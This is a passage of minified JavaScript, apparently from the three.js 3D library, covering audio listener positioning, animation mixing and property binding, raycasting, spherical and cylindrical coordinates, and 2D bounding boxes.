r=this.context.currentTime+this.listener.timeDelta;n.positionX.linearRampToValueAtTime(wc.x,r),n.positionY.linearRampToValueAtTime(wc.y,r),n.positionZ.linearRampToValueAtTime(wc.z,r),n.orientationX.linearRampToValueAtTime(Sc.x,r),n.orientationY.linearRampToValueAtTime(Sc.y,r),n.orientationZ.linearRampToValueAtTime(Sc.z,r)}else n.setPosition(wc.x,wc.y,wc.z),n.setOrientation(Sc.x,Sc.y,Sc.z)}},t}(_c),Mc=function(){function e(e,t){this.analyser=e.context.createAnalyser(),this.analyser.fftSize=void 0!==t?t:2048,this.data=new Uint8Array(this.analyser.frequencyBinCount),e.getOutput().connect(this.analyser)}var t=e.prototype;return t.getFrequencyData=function(){return this.analyser.getByteFrequencyData(this.data),this.data},t.getAverageFrequency=function(){for(var e=0,t=this.getFrequencyData(),n=0;n<t.length;n++)e+=t[n];return e/t.length},e}();function Bc(e,t,n){var r,i,a;switch(this.binding=e,this.valueSize=n,t){case"quaternion":r=this._slerp,i=this._slerpAdditive,a=this._setAdditiveIdentityQuaternion,this.buffer=new Float64Array(6*n),this._workIndex=5;break;case"string":case"bool":r=this._select,i=this._select,a=this._setAdditiveIdentityOther,this.buffer=new Array(5*n);break;default:r=this._lerp,i=this._lerpAdditive,a=this._setAdditiveIdentityNumeric,this.buffer=new Float64Array(5*n)}this._mixBufferRegion=r,this._mixBufferRegionAdditive=i,this._setIdentity=a,this._origIndex=3,this._addIndex=4,this.cumulativeWeight=0,this.cumulativeWeightAdditive=0,this.useCount=0,this.referenceCount=0}Object.assign(Bc.prototype,{accumulate:function(e,t){var n=this.buffer,r=this.valueSize,i=e*r+r,a=this.cumulativeWeight;if(0===a){for(var o=0;o!==r;++o)n[i+o]=n[o];a=t}else{var s=t/(a+=t);this._mixBufferRegion(n,i,0,s,r)}this.cumulativeWeight=a},accumulateAdditive:function(e){var t=this.buffer,n=this.valueSize,r=n*this._addIndex;0===this.cumulativeWeightAdditive&&this._setIdentity(),this._mixBufferRegionAdditive(t,r,0,e,n),this.cumulativeWeightAdditive+=e},apply:function(e){var t=this.valueSize,n=this.buffer,r=e*t+t,i=this.cumulativeWeight,a=this.cumulativeWeightAdditive,o=this.binding;if(this.cumulativeWeight=0,this.cumulativeWeightAdditive=0,i<1){var s=t*this._origIndex;this._mixBufferRegion(n,r,s,1-i,t)}0<a&&this._mixBufferRegionAdditive(n,r,this._addIndex*t,1,t);for(var l=t,c=t+t;l!==c;++l)if(n[l]!==n[l+t]){o.setValue(n,r);break}},saveOriginalState:function(){var e=this.binding,t=this.buffer,n=this.valueSize,r=n*this._origIndex;e.getValue(t,r);for(var i=n,a=r;i!==a;++i)t[i]=t[r+i%n];this._setIdentity(),this.cumulativeWeight=0,this.cumulativeWeightAdditive=0},restoreOriginalState:function(){var e=3*this.valueSize;this.binding.setValue(this.buffer,e)},_setAdditiveIdentityNumeric:function(){for(var e=this._addIndex*this.valueSize,t=e+this.valueSize,n=e;n<t;n++)this.buffer[n]=0},_setAdditiveIdentityQuaternion:function(){this._setAdditiveIdentityNumeric(),this.buffer[this._addIndex*this.valueSize+3]=1},_setAdditiveIdentityOther:function(){for(var e=this._origIndex*this.valueSize,t=this._addIndex*this.valueSize,n=0;n<this.valueSize;n++)this.buffer[t+n]=this.buffer[e+n]},_select:function(e,t,n,r,i){if(.5<=r)for(var a=0;a!==i;++a)e[t+a]=e[n+a]},_slerp:function(e,t,n,r){pe.slerpFlat(e,t,e,t,e,n,r)},_slerpAdditive:function(e,t,n,r,i){var a=this._workIndex*i;pe.multiplyQuaternionsFlat(e,a,e,t,e,n),pe.slerpFlat(e,t,e,t,e,a,r)},_lerp:function(e,t,n,r,i){for(var a=1-r,o=0;o!==i;++o){var s=t+o;e[s]=e[s]*a+e[n+o]*r}},_lerpAdditive:function(e,t,n,r,i){for(var a=0;a!==i;++a){var o=t+a;e[o]=e[o]+e[n+a]*r}}});var Ec="\\[\\]\\.:\\/",Tc=new RegExp("["+Ec+"]","g"),Pc="[^"+Ec+"]",Ic="[^"+Ec.replace("\\.","")+"]",Fc=/((?:WC+[\/:])*)/.source.replace("WC",Pc),Lc=/(WCOD+)?/.source.replace("WCOD",Ic),Oc=/(?:\.(WC+)(?:\[(.+)\])?)?/.source.replace("WC",Pc),Nc=/\.(WC+)(?:\[(.+)\])?/.source.replace("WC",Pc),Dc=new RegExp("^"+Fc+Lc+Oc+Nc+"$"),Rc=["material","materials","bones"];function jc(e,t,n){var r=n||Uc.parseTrackName(t);this._targetGroup=e,this._bindings=e.subscribe_(t,r)}function Uc(e,t,n){this.path=t,this.parsedPath=n||Uc.parseTrackName(t),this.node=Uc.findNode(e,this.parsedPath.nodeName)||e,this.rootNode=e}function $c(){this.uuid=J.generateUUID(),this._objects=Array.prototype.slice.call(arguments),this.nCachedObjects_=0;var e={};this._indicesByUUID=e;for(var t=0,n=arguments.length;t!==n;++t)e[arguments[t].uuid]=t;this._paths=[],this._parsedPaths=[],this._bindings=[],this._bindingsIndicesByPath={};var r=this;this.stats={objects:{get total(){return r._objects.length},get inUse(){return this.total-r.nCachedObjects_}},get bindingsPerObject(){return r._bindings.length}}}Object.assign(jc.prototype,{getValue:function(e,t){this.bind();var n=this._targetGroup.nCachedObjects_,r=this._bindings[n];void 0!==r&&r.getValue(e,t)},setValue:function(e,t){for(var n=this._bindings,r=this._targetGroup.nCachedObjects_,i=n.length;r!==i;++r)n[r].setValue(e,t)},bind:function(){for(var e=this._bindings,t=this._targetGroup.nCachedObjects_,n=e.length;t!==n;++t)e[t].bind()},unbind:function(){for(var e=this._bindings,t=this._targetGroup.nCachedObjects_,n=e.length;t!==n;++t)e[t].unbind()}}),Object.assign(Uc,{Composite:jc,create:function(e,t,n){return e&&e.isAnimationObjectGroup?new Uc.Composite(e,t,n):new Uc(e,t,n)},sanitizeNodeName:function(e){return e.replace(/\s/g,"_").replace(Tc,"")},parseTrackName:function(e){var t=Dc.exec(e);if(!t)throw new Error("PropertyBinding: Cannot parse trackName: "+e);var n={nodeName:t[2],objectName:t[3],objectIndex:t[4],propertyName:t[5],propertyIndex:t[6]},r=n.nodeName&&n.nodeName.lastIndexOf(".");if(void 0!==r&&-1!==r){var i=n.nodeName.substring(r+1);-1!==Rc.indexOf(i)&&(n.nodeName=n.nodeName.substring(0,r),n.objectName=i)}if(null===n.propertyName||0===n.propertyName.length)throw new Error("PropertyBinding: can not parse propertyName from trackName: "+e);return n},findNode:function(e,t){if(!t||""===t||"."===t||-1===t||t===e.name||t===e.uuid)return e;if(e.skeleton){var n=e.skeleton.getBoneByName(t);if(void 0!==n)return n}if(e.children){var r=function e(n){for(var r=0;r<n.length;r++){var i=n[r];if(i.name===t||i.uuid===t)return i;var a=e(i.children);if(a)return a}return null}(e.children);if(r)return r}return null}}),Object.assign(Uc.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(e,t){e[t]=this.node[this.propertyName]},function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)e[t++]=n[r]},function(e,t){e[t]=this.resolvedProperty[this.propertyIndex]},function(e,t){this.resolvedProperty.toArray(e,t)}],SetterByBindingTypeAndVersioning:[[function(e,t){this.targetObject[this.propertyName]=e[t]},function(e,t){this.targetObject[this.propertyName]=e[t],this.targetObject.needsUpdate=!0},function(e,t){this.targetObject[this.propertyName]=e[t],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)n[r]=e[t++]},function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)n[r]=e[t++];this.targetObject.needsUpdate=!0},function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)n[r]=e[t++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(e,t){this.resolvedProperty[this.propertyIndex]=e[t]},function(e,t){this.resolvedProperty[this.propertyIndex]=e[t],this.targetObject.needsUpdate=!0},function(e,t){this.resolvedProperty[this.propertyIndex]=e[t],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(e,t){this.resolvedProperty.fromArray(e,t)},function(e,t){this.resolvedProperty.fromArray(e,t),this.targetObject.needsUpdate=!0},function(e,t){this.resolvedProperty.fromArray(e,t),this.targetObject.matrixWorldNeedsUpdate=!0}]],getValue:function(e,t){this.bind(),this.getValue(e,t)},setValue:function(e,t){this.bind(),this.setValue(e,t)},bind:function(){var e=this.node,t=this.parsedPath,n=t.objectName,r=t.propertyName,i=t.propertyIndex;if(e||(e=Uc.findNode(this.rootNode,t.nodeName)||this.rootNode,this.node=e),this.getValue=this._getValue_unavailable,this.setValue=this._setValue_unavailable,e){if(n){var a=t.objectIndex;switch(n){case"materials":if(!e.material)return;if(!e.material.materials)return;e=e.material.materials;break;case"bones":if(!e.skeleton)return;e=e.skeleton.bones;for(var o=0;o<e.length;o++)if(e[o].name===a){a=o;break}break;default:if(void 0===e[n])return;e=e[n]}if(void 0!==a){if(void 0===e[a])return;e=e[a]}}var s=e[r];if(void 0!==s){var l=this.Versioning.None;void 0!==(this.targetObject=e).needsUpdate?l=this.Versioning.NeedsUpdate:void 0!==e.matrixWorldNeedsUpdate&&(l=this.Versioning.MatrixWorldNeedsUpdate);var c=this.BindingType.Direct;if(void 0!==i){if("morphTargetInfluences"===r){if(!e.geometry)return;if(!e.geometry.isBufferGeometry)return;if(!e.geometry.morphAttributes)return;void 0!==e.morphTargetDictionary[i]&&(i=e.morphTargetDictionary[i])}c=this.BindingType.ArrayElement,this.resolvedProperty=s,this.propertyIndex=i}else void 0!==s.fromArray&&void 0!==s.toArray?(c=this.BindingType.HasFromToArray,this.resolvedProperty=s):Array.isArray(s)?(c=this.BindingType.EntireArray,this.resolvedProperty=s):this.propertyName=r;this.getValue=this.GetterByBindingType[c],this.setValue=this.SetterByBindingTypeAndVersioning[c][l]}else t.nodeName}},unbind:function(){this.node=null,this.getValue=this._getValue_unbound,this.setValue=this._setValue_unbound}}),Object.assign(Uc.prototype,{_getValue_unbound:Uc.prototype.getValue,_setValue_unbound:Uc.prototype.setValue}),Object.assign($c.prototype,{isAnimationObjectGroup:!0,add:function(){for(var e=this._objects,t=this._indicesByUUID,n=this._paths,r=this._parsedPaths,i=this._bindings,a=i.length,o=e.length,s=this.nCachedObjects_,l=0,c=arguments.length;l!==c;++l){var u=arguments[l],d=u.uuid,p=t[d];if(void 0===p){p=o++,t[d]=p,e.push(u);for(var h=0,f=a;h!==f;++h)i[h].push(new Uc(u,n[h],r[h]))}else if(p<s){e[p];var A=--s,m=e[A];e[t[m.uuid]=p]=m,e[t[d]=A]=u;for(var v=0,g=a;v!==g;++v){var y=i[v],b=y[A],_=y[p];y[p]=b,void 0===_&&(_=new Uc(u,n[v],r[v])),y[A]=_}}else e[p]}this.nCachedObjects_=s},remove:function(){for(var e=this._objects,t=this._indicesByUUID,n=this._bindings,r=n.length,i=this.nCachedObjects_,a=0,o=arguments.length;a!==o;++a){var s=arguments[a],l=s.uuid,c=t[l];if(void 0!==c&&i<=c){var u=i++,d=e[u];e[t[d.uuid]=c]=d,e[t[l]=u]=s;for(var p=0,h=r;p!==h;++p){var f=n[p],A=f[u],m=f[c];f[c]=A,f[u]=m}}}this.nCachedObjects_=i},uncache:function(){for(var e=this._objects,t=this._indicesByUUID,n=this._bindings,r=n.length,i=this.nCachedObjects_,a=e.length,o=0,s=arguments.length;o!==s;++o){var l=arguments[o].uuid,c=t[l];if(void 0!==c)if(delete t[l],c<i){var u=--i,d=e[u],p=--a,h=e[p];e[t[d.uuid]=c]=d,e[t[h.uuid]=u]=h,e.pop();for(var f=0,A=r;f!==A;++f){var m=n[f],v=m[u],g=m[p];m[c]=v,m[u]=g,m.pop()}}else{var y=--a,b=e[y];0<y&&(t[b.uuid]=c),e[c]=b,e.pop();for(var _=0,w=r;_!==w;++_){var C=n[_];C[c]=C[y],C.pop()}}}this.nCachedObjects_=i},subscribe_:function(e,t){var n=this._bindingsIndicesByPath,r=n[e],i=this._bindings;if(void 0!==r)return i[r];var a=this._paths,o=this._parsedPaths,s=this._objects,l=s.length,c=this.nCachedObjects_,u=new Array(l);r=i.length,n[e]=r,a.push(e),o.push(t),i.push(u);for(var d=c,p=s.length;d!==p;++d){var h=s[d];u[d]=new Uc(h,e,t)}return u},unsubscribe_:function(e){var t=this._bindingsIndicesByPath,n=t[e];if(void 0!==n){var r=this._paths,i=this._parsedPaths,a=this._bindings,o=a.length-1,s=a[o];a[t[e[o]]=n]=s,a.pop(),i[n]=i[o],i.pop(),r[n]=r[o],r.pop()}}});var zc=function(){function e(e,t,n,r){this._mixer=e,this._clip=t,this._localRoot=n||null,this.blendMode=r||t.blendMode;for(var i=t.tracks,a=i.length,o=new Array(a),s={endingStart:2400,endingEnd:2400},l=0;l!==a;++l){var c=i[l].createInterpolant(null);(o[l]=c).settings=s}this._interpolantSettings=s,this._interpolants=o,this._propertyBindings=new Array(a),this._cacheIndex=null,this._byClipCacheIndex=null,this._timeScaleInterpolant=null,this._weightInterpolant=null,this.loop=2201,this._loopCount=-1,this._startTime=null,this.time=0,this.timeScale=1,this._effectiveTimeScale=1,this.weight=1,this._effectiveWeight=1,this.repetitions=1/0,this.paused=!1,this.enabled=!0,this.clampWhenFinished=!1,this.zeroSlopeAtStart=!0,this.zeroSlopeAtEnd=!0}var t=e.prototype;return t.play=function(){return this._mixer._activateAction(this),this},t.stop=function(){return this._mixer._deactivateAction(this),this.reset()},t.reset=function(){return this.paused=!1,this.enabled=!0,this.time=0,this._loopCount=-1,this._startTime=null,this.stopFading().stopWarping()},t.isRunning=function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},t.isScheduled=function(){return this._mixer._isActiveAction(this)},t.startAt=function(e){return this._startTime=e,this},t.setLoop=function(e,t){return this.loop=e,this.repetitions=t,this},t.setEffectiveWeight=function(e){return this.weight=e,this._effectiveWeight=this.enabled?e:0,this.stopFading()},t.getEffectiveWeight=function(){return this._effectiveWeight},t.fadeIn=function(e){return this._scheduleFading(e,0,1)},t.fadeOut=function(e){return this._scheduleFading(e,1,0)},t.crossFadeFrom=function(e,t,n){if(e.fadeOut(t),this.fadeIn(t),n){var r=this._clip.duration,i=e._clip.duration,a=i/r,o=r/i;e.warp(1,a,t),this.warp(o,1,t)}return this},t.crossFadeTo=function(e,t,n){return e.crossFadeFrom(this,t,n)},t.stopFading=function(){var e=this._weightInterpolant;return null!==e&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(e)),this},t.setEffectiveTimeScale=function(e){return this.timeScale=e,this._effectiveTimeScale=this.paused?0:e,this.stopWarping()},t.getEffectiveTimeScale=function(){return this._effectiveTimeScale},t.setDuration=function(e){return this.timeScale=this._clip.duration/e,this.stopWarping()},t.syncWith=function(e){return this.time=e.time,this.timeScale=e.timeScale,this.stopWarping()},t.halt=function(e){return this.warp(this._effectiveTimeScale,0,e)},t.warp=function(e,t,n){var r=this._mixer,i=r.time,a=this.timeScale,o=this._timeScaleInterpolant;null===o&&(o=r._lendControlInterpolant(),this._timeScaleInterpolant=o);var s=o.parameterPositions,l=o.sampleValues;return s[0]=i,s[1]=i+n,l[0]=e/a,l[1]=t/a,this},t.stopWarping=function(){var e=this._timeScaleInterpolant;return null!==e&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(e)),this},t.getMixer=function(){return this._mixer},t.getClip=function(){return this._clip},t.getRoot=function(){return this._localRoot||this._mixer._root},t._update=function(e,t,n,r){if(this.enabled){var i=this._startTime;if(null!==i){var a=(e-i)*n;if(a<0||0===n)return;this._startTime=null,t=n*a}t*=this._updateTimeScale(e);var o=this._updateTime(t),s=this._updateWeight(e);if(0<s){var l=this._interpolants,c=this._propertyBindings;switch(this.blendMode){case 2501:for(var u=0,d=l.length;u!==d;++u)l[u].evaluate(o),c[u].accumulateAdditive(s);break;case 2500:default:for(var p=0,h=l.length;p!==h;++p)l[p].evaluate(o),c[p].accumulate(r,s)}}}else this._updateWeight(e)},t._updateWeight=function(e){var t=0;if(this.enabled){t=this.weight;var n=this._weightInterpolant;if(null!==n){var r=n.evaluate(e)[0];t*=r,e>n.parameterPositions[1]&&(this.stopFading(),0===r&&(this.enabled=!1))}}return this._effectiveWeight=t},t._updateTimeScale=function(e){var t=0;if(!this.paused){t=this.timeScale;var n=this._timeScaleInterpolant;null!==n&&(t*=n.evaluate(e)[0],e>n.parameterPositions[1]&&(this.stopWarping(),0===t?this.paused=!0:this.timeScale=t))}return this._effectiveTimeScale=t},t._updateTime=function(e){var t=this._clip.duration,n=this.loop,r=this.time+e,i=this._loopCount,a=2202===n;if(0===e)return-1===i?r:a&&1==(1&i)?t-r:r;if(2200===n){-1===i&&(this._loopCount=0,this._setEndings(!0,!0,!1));e:{if(t<=r)r=t;else{if(!(r<0)){this.time=r;break e}r=0}this.clampWhenFinished?this.paused=!0:this.enabled=!1,this.time=r,this._mixer.dispatchEvent({type:"finished",action:this,direction:e<0?-1:1})}}else{if(-1===i&&(0<=e?(i=0,this._setEndings(!0,0===this.repetitions,a)):this._setEndings(0===this.repetitions,!0,a)),t<=r||r<0){var o=Math.floor(r/t);r-=t*o,i+=Math.abs(o);var s=this.repetitions-i;if(s<=0)this.clampWhenFinished?this.paused=!0:this.enabled=!1,r=0<e?t:0,this.time=r,this._mixer.dispatchEvent({type:"finished",action:this,direction:0<e?1:-1});else{if(1===s){var l=e<0;this._setEndings(l,!l,a)}else this._setEndings(!1,!1,a);this._loopCount=i,this.time=r,this._mixer.dispatchEvent({type:"loop",action:this,loopDelta:o})}}else this.time=r;if(a&&1==(1&i))return t-r}return r},t._setEndings=function(e,t,n){var r=this._interpolantSettings;r.endingEnd=n?r.endingStart=2401:(r.endingStart=e?this.zeroSlopeAtStart?2401:2400:2402,t?this.zeroSlopeAtEnd?2401:2400:2402)},t._scheduleFading=function(e,t,n){var r=this._mixer,i=r.time,a=this._weightInterpolant;null===a&&(a=r._lendControlInterpolant(),this._weightInterpolant=a);var o=a.parameterPositions,s=a.sampleValues;return o[0]=i,s[0]=t,o[1]=i+e,s[1]=n,this},e}();function Hc(e){this._root=e,this._initMemoryManager(),this._accuIndex=0,this.time=0,this.timeScale=1}Hc.prototype=Object.assign(Object.create(K.prototype),{constructor:Hc,_bindAction:function(e,t){var n=e._localRoot||this._root,r=e._clip.tracks,i=r.length,a=e._propertyBindings,o=e._interpolants,s=n.uuid,l=this._bindingsByRootAndName,c=l[s];void 0===c&&(c={},l[s]=c);for(var u=0;u!==i;++u){var d=r[u],p=d.name,h=c[p];if(void 0!==h)a[u]=h;else{if(void 0!==(h=a[u])){null===h._cacheIndex&&(++h.referenceCount,this._addInactiveBinding(h,s,p));continue}var f=t&&t._propertyBindings[u].binding.parsedPath;++(h=new Bc(Uc.create(n,p,f),d.ValueTypeName,d.getValueSize())).referenceCount,this._addInactiveBinding(h,s,p),a[u]=h}o[u].resultBuffer=h.buffer}},_activateAction:function(e){if(!this._isActiveAction(e)){if(null===e._cacheIndex){var t=(e._localRoot||this._root).uuid,n=e._clip.uuid,r=this._actionsByClip[n];this._bindAction(e,r&&r.knownActions[0]),this._addInactiveAction(e,n,t)}for(var i=e._propertyBindings,a=0,o=i.length;a!==o;++a){var s=i[a];0==s.useCount++&&(this._lendBinding(s),s.saveOriginalState())}this._lendAction(e)}},_deactivateAction:function(e){if(this._isActiveAction(e)){for(var t=e._propertyBindings,n=0,r=t.length;n!==r;++n){var i=t[n];0==--i.useCount&&(i.restoreOriginalState(),this._takeBackBinding(i))}this._takeBackAction(e)}},_initMemoryManager:function(){this._actions=[],this._nActiveActions=0,this._actionsByClip={},this._bindings=[],this._nActiveBindings=0,this._bindingsByRootAndName={},this._controlInterpolants=[],this._nActiveControlInterpolants=0;var e=this;this.stats={actions:{get total(){return e._actions.length},get inUse(){return e._nActiveActions}},bindings:{get total(){return e._bindings.length},get inUse(){return e._nActiveBindings}},controlInterpolants:{get total(){return e._controlInterpolants.length},get inUse(){return e._nActiveControlInterpolants}}}},_isActiveAction:function(e){var t=e._cacheIndex;return null!==t&&t<this._nActiveActions},_addInactiveAction:function(e,t,n){var r=this._actions,i=this._actionsByClip,a=i[t];if(void 0===a)a={knownActions:[e],actionByRoot:{}},e._byClipCacheIndex=0,i[t]=a;else{var o=a.knownActions;e._byClipCacheIndex=o.length,o.push(e)}e._cacheIndex=r.length,r.push(e),a.actionByRoot[n]=e},_removeInactiveAction:function(e){var t=this._actions,n=t[t.length-1],r=e._cacheIndex;t[n._cacheIndex=r]=n,t.pop(),e._cacheIndex=null;var i=e._clip.uuid,a=this._actionsByClip,o=a[i],s=o.knownActions,l=s[s.length-1],c=e._byClipCacheIndex;s[l._byClipCacheIndex=c]=l,s.pop(),e._byClipCacheIndex=null,delete o.actionByRoot[(e._localRoot||this._root).uuid],0===s.length&&delete a[i],this._removeInactiveBindingsForAction(e)},_removeInactiveBindingsForAction:function(e){for(var t=e._propertyBindings,n=0,r=t.length;n!==r;++n){var i=t[n];0==--i.referenceCount&&this._removeInactiveBinding(i)}},_lendAction:function(e){var t=this._actions,n=e._cacheIndex,r=this._nActiveActions++,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i},_takeBackAction:function(e){var t=this._actions,n=e._cacheIndex,r=--this._nActiveActions,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i},_addInactiveBinding:function(e,t,n){var r=this._bindingsByRootAndName,i=this._bindings,a=r[t];void 0===a&&(a={},r[t]=a),(a[n]=e)._cacheIndex=i.length,i.push(e)},_removeInactiveBinding:function(e){var t=this._bindings,n=e.binding,r=n.rootNode.uuid,i=n.path,a=this._bindingsByRootAndName,o=a[r],s=t[t.length-1],l=e._cacheIndex;t[s._cacheIndex=l]=s,t.pop(),delete o[i],0===Object.keys(o).length&&delete a[r]},_lendBinding:function(e){var t=this._bindings,n=e._cacheIndex,r=this._nActiveBindings++,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i},_takeBackBinding:function(e){var t=this._bindings,n=e._cacheIndex,r=--this._nActiveBindings,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i},_lendControlInterpolant:function(){var e=this._controlInterpolants,t=this._nActiveControlInterpolants++,n=e[t];return void 0===n&&(e[(n=new js(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer)).__cacheIndex=t]=n),n},_takeBackControlInterpolant:function(e){var t=this._controlInterpolants,n=e.__cacheIndex,r=--this._nActiveControlInterpolants,i=t[r];t[e.__cacheIndex=r]=e,t[i.__cacheIndex=n]=i},_controlInterpolantsResultBuffer:new Float32Array(1),clipAction:function(e,t,n){var r=t||this._root,i=r.uuid,a="string"==typeof e?qs.findByName(r,e):e,o=null!==a?a.uuid:e,s=this._actionsByClip[o],l=null;if(void 0===n&&(n=null!==a?a.blendMode:2500),void 0!==s){var c=s.actionByRoot[i];if(void 0!==c&&c.blendMode===n)return c;l=s.knownActions[0],null===a&&(a=l._clip)}if(null===a)return null;var u=new zc(this,a,t,n);return this._bindAction(u,l),this._addInactiveAction(u,o,i),u},existingAction:function(e,t){var n=t||this._root,r=n.uuid,i="string"==typeof e?qs.findByName(n,e):e,a=i?i.uuid:e,o=this._actionsByClip[a];return void 0!==o&&o.actionByRoot[r]||null},stopAllAction:function(){for(var e=this._actions,t=this._nActiveActions-1;0<=t;--t)e[t].stop();return this},update:function(e){e*=this.timeScale;for(var t=this._actions,n=this._nActiveActions,r=this.time+=e,i=Math.sign(e),a=this._accuIndex^=1,o=0;o!==n;++o)t[o]._update(r,e,i,a);for(var s=this._bindings,l=this._nActiveBindings,c=0;c!==l;++c)s[c].apply(a);return this},setTime:function(e){for(var t=this.time=0;t<this._actions.length;t++)this._actions[t].time=0;return this.update(e)},getRoot:function(){return this._root},uncacheClip:function(e){var t=this._actions,n=e.uuid,r=this._actionsByClip,i=r[n];if(void 0!==i){for(var a=i.knownActions,o=0,s=a.length;o!==s;++o){var l=a[o];this._deactivateAction(l);var c=l._cacheIndex,u=t[t.length-1];l._cacheIndex=null,l._byClipCacheIndex=null,t[u._cacheIndex=c]=u,t.pop(),this._removeInactiveBindingsForAction(l)}delete r[n]}},uncacheRoot:function(e){var t=e.uuid,n=this._actionsByClip;for(var r in n){var i=n[r].actionByRoot[t];void 0!==i&&(this._deactivateAction(i),this._removeInactiveAction(i))}var a=this._bindingsByRootAndName[t];if(void 0!==a)for(var o in a){var s=a[o];s.restoreOriginalState(),this._removeInactiveBinding(s)}},uncacheAction:function(e,t){var n=this.existingAction(e,t);null!==n&&(this._deactivateAction(n),this._removeInactiveAction(n))}});var Vc=function(){function e(e){"string"==typeof e&&(e=arguments[1]),this.value=e}return e.prototype.clone=function(){return new e(void 0===this.value.clone?this.value:this.value.clone())},e}();function Qc(e,t,n){Yi.call(this,e,t),this.meshPerAttribute=n||1}function Gc(e,t,n,r,i){this.buffer=e,this.type=t,this.itemSize=n,this.elementSize=r,this.count=i,this.version=0}function Wc(e,t,n,r){this.ray=new Ue(e,t),this.near=n||0,this.far=r||1/0,this.camera=null,this.layers=new Je,this.params={Mesh:{},Line:{threshold:1},LOD:{},Points:{threshold:1},Sprite:{}},Object.defineProperties(this.params,{PointCloud:{get:function(){return this.Points}}})}function Kc(e,t){return e.distance-t.distance}function qc(e,t,n,r){if(e.layers.test(t.layers)&&e.raycast(t,n),!0===r)for(var i=e.children,a=0,o=i.length;a<o;a++)qc(i[a],t,n,!0)}Qc.prototype=Object.assign(Object.create(Yi.prototype),{constructor:Qc,isInstancedInterleavedBuffer:!0,copy:function(e){return Yi.prototype.copy.call(this,e),this.meshPerAttribute=e.meshPerAttribute,this},clone:function(e){var t=Yi.prototype.clone.call(this,e);return t.meshPerAttribute=this.meshPerAttribute,t},toJSON:function(e){var t=Yi.prototype.toJSON.call(this,e);return t.isInstancedInterleavedBuffer=!0,t.meshPerAttribute=this.meshPerAttribute,t}}),Object.defineProperty(Gc.prototype,"needsUpdate",{set:function(e){!0===e&&this.version++}}),Object.assign(Gc.prototype,{isGLBufferAttribute:!0,setBuffer:function(e){return this.buffer=e,this},setType:function(e,t){return this.type=e,this.elementSize=t,this},setItemSize:function(e){return this.itemSize=e,this},setCount:function(e){return this.count=e,this}}),Object.assign(Wc.prototype,{set:function(e,t){this.ray.set(e,t)},setFromCamera:function(e,t){t&&t.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(t.matrixWorld),this.ray.direction.set(e.x,e.y,.5).unproject(t).sub(this.ray.origin).normalize(),this.camera=t):t&&t.isOrthographicCamera&&(this.ray.origin.set(e.x,e.y,(t.near+t.far)/(t.near-t.far)).unproject(t),this.ray.direction.set(0,0,-1).transformDirection(t.matrixWorld),this.camera=t)},intersectObject:function(e,t,n){var r=n||[];return qc(e,this,r,t),r.sort(Kc),r},intersectObjects:function(e,t,n){var r=n||[];if(!1===Array.isArray(e))return r;for(var i=0,a=e.length;i<a;i++)qc(e[i],this,r,t);return r.sort(Kc),r}});var Xc=function(){function e(e,t,n){return void 0===e&&(e=1),void 0===t&&(t=0),void 0===n&&(n=0),this.radius=e,this.phi=t,this.theta=n,this}var t=e.prototype;return t.set=function(e,t,n){return this.radius=e,this.phi=t,this.theta=n,this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.radius=e.radius,this.phi=e.phi,this.theta=e.theta,this},t.makeSafe=function(){return this.phi=Math.max(1e-6,Math.min(Math.PI-1e-6,this.phi)),this},t.setFromVector3=function(e){return this.setFromCartesianCoords(e.x,e.y,e.z)},t.setFromCartesianCoords=function(e,t,n){return this.radius=Math.sqrt(e*e+t*t+n*n),0===this.radius?(this.theta=0,this.phi=0):(this.theta=Math.atan2(e,n),this.phi=Math.acos(J.clamp(t/this.radius,-1,1))),this},e}(),Yc=function(){function e(e,t,n){return this.radius=void 0!==e?e:1,this.theta=void 0!==t?t:0,this.y=void 0!==n?n:0,this}var t=e.prototype;return t.set=function(e,t,n){return this.radius=e,this.theta=t,this.y=n,this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.radius=e.radius,this.theta=e.theta,this.y=e.y,this},t.setFromVector3=function(e){return this.setFromCartesianCoords(e.x,e.y,e.z)},t.setFromCartesianCoords=function(e,t,n){return this.radius=Math.sqrt(e*e+n*n),this.theta=Math.atan2(e,n),this.y=t,this},e}(),Jc=new ie,Zc=function(){function e(e,t){Object.defineProperty(this,"isBox2",{value:!0}),this.min=void 0!==e?e:new ie(1/0,1/0),this.max=void 0!==t?t:new ie(-1/0,-1/0)}var t=e.prototype;return t.set=function(e,t){return this.min.copy(e),this.max.copy(t),this},t.setFromPoints=function(e){this.makeEmpty();for(var t=0,n=e.length;t<n;t++)this.expandByPoint(e[t]);return this},t.setFromCenterAndSize=function(e,t){var n=Jc.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(n),this.max.copy(e).add(n),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.min.copy(e.min),this.max.copy(e.max),this},t.makeEmpty=function(){return this.min.x=this.min.y=1/0,this.max.x=this.max.y=-1/0,this},t.isEmpty=function(){return this.max.x<this.min.x||this.max.y<this.min.y},t.getCenter=function(e){return void 0===e&&(e=new ie),this.isEmpty()?e.set(0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)},t.getSize=function(e){return void 0===e&&(e=new ie),this.isEmpty()?e.set(0,0):e.subVectors(this.max,this.min)},t.expandByPoint=function(e){return this.min.min(e),this.max.max(e),this},t.expandByVector=function(e){return 